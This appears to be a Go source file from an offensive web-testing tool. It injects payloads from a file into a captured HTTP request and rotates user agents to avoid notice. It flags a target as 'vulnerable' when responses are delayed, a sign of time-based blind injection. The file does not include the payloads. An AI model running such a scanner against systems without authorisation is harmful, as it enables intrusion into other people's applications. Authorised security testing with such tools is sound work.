package code

import (
	"fmt"
	"net/url"
	"os"
	"strings"
	"sync"
)

const (
	ColorGreen = "\033[32m"
	ColorRed   = "\033[31m"
	ColorReset = "\033[0m"
	TextBold   = "\033[1m"
	TextUnbold = "\033[21m"
)

func ScanPost() {
	if len(os.Args) <= 2 {
		fmt.Println("Please use Command go run . -r request.txt")
		return
	}
	dataUserAgents := DataUserAgent()
	countUserAgent := -1
	payloads, err := readPayloadsFromFile()
	if err != nil {
		fmt.Println(err)
		return
	}
	content, err := os.ReadFile(os.Args[2])
	if err != nil {
		fmt.Println(err)
		return
	}
	requestStringArr := strings.Split(string(content), "\n")

	var wg sync.WaitGroup
	// var mutex sync.Mutex
	for key, payload := range payloads {
		countUserAgent++
		wg.Add(1)
		go func(keyValue, p string, countAgent int) {
			defer wg.Done()
			p = strings.ReplaceAll(p, "5", "10")
			p = url.QueryEscape(p)
			response, elapsedTime, err := makeHeaderBody(requestStringArr, p, dataUserAgents[countAgent%77])
			if err != nil {
				fmt.Println("Error sending HTTP request")
				return
			}

			if elapsedTime > 9 {
				response, elapsedTime, err = makeHeaderBody(requestStringArr, p, dataUserAgents[countAgent%77])
				if err != nil {
					fmt.Println("Error sending HTTP request")
					return
				}
				if elapsedTime > 9 {
					fmt.Printf("%s(%s) %s %s vulnerable%s\n", ColorGreen+TextBold, response.Status, p, keyValue, ColorReset)
				} else {
					fmt.Printf("%s (%s) failed!%s\n", ColorRed, response.Status, ColorReset)
				}

			} else {
				fmt.Printf("%s (%s) failed!%s\n", ColorRed, response.Status, ColorReset)
			}

		}(key, payload, countUserAgent)
	}
	wg.Wait()
}
